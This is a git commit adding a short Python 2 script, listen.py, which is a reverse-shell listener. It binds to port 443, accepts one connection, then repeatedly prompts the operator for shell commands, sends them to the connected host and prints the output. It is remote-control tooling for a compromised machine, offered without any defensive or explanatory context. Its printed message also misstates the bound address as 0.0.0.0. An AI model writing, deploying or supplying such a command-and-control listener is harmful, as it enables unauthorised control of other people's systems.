e4cd061d69c2d4e84114175c24cf5a34da6a201c
Protoco-l <0r3t9c6l@gmail.com>
2017-02-08 23:52:27 +0300

    Add files via upload

---
+++ listen.py
@@ -0,0 +1,18 @@
+from socket import *
+HOST = '192.168.100.5'        
+PORT = 443         
+s = socket(AF_INET, SOCK_STREAM)
+s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+s.bind((HOST, PORT))
+print "Listening on 0.0.0.0:%s" % str(PORT)
+s.listen(10)
+conn, addr = s.accept()
+print 'Connected by', addr
+data = conn.recv(1024)
+while 1:
+     command = raw_input("Enter shell command or quit: ")
+     conn.send(command)
+     if command == "quit": break
+     data = conn.recv(1024)
+     print data
+conn.close()
